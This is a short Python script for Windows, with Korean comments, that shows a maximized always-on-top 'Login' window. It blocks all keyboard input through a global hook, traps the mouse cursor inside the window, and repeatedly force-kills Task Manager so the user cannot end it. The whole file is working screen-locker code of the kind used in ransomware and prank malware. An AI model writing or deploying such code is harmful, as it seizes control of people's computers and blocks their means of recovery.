import wx
import win32api
import threading
import time
import os
import psutil
import pyWinhook

class blockInput(): # 키보드 입력 차단
    def OnKeyboardEvent(self,event):
        return False

    def block(self, keyboard = True):
        if keyboard:
            self.hm.KeyAll = self.OnKeyboardEvent
            self.hm.HookKeyboard()

    def __init__(self):
        self.hm = pyWinhook.HookManager()

class Frame(wx.Frame) : # 프레임 생성
    def __init__(self):
        wx.Frame.__init__(self, None, title="Login", style=wx.CLOSE_BOX)
        panel = wx.Panel(self)

        def onClose(self) : # 닫기버튼
            self.Destroy()

        def cursor(): # 커서 가두기
            while True:
                width, height = self.GetSize()
                win32api.ClipCursor((0, 0, width - 2, height))
                time.sleep(1)

        self.button = wx.Button(self, 1, label="닫기", pos=(100, 100), size=(300, 40))
        self.Bind(wx.EVT_BUTTON, onClose, id=1)

        thread = threading.Thread(target=cursor, daemon=True)
        thread.start()

def disTask(): # 작업관리자 무력화
    while True:
        iter = psutil.process_iter()
        for process in iter:
            try:
                if "taskmgr.exe" in process.name().lower():
                    print("catch")
                    os.system("taskkill /f /im taskmgr.exe")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                print("except")
                pass

app = wx.App(False)

frame = Frame()
print("frame")

frame.SetTransparent(500)
frame.SetWindowStyle(wx.STAY_ON_TOP)
frame.Maximize()

frame.Show()

block = blockInput()
block.block()

taskThread = threading.Thread(target=disTask, daemon=True)
taskThread.start()

app.MainLoop()

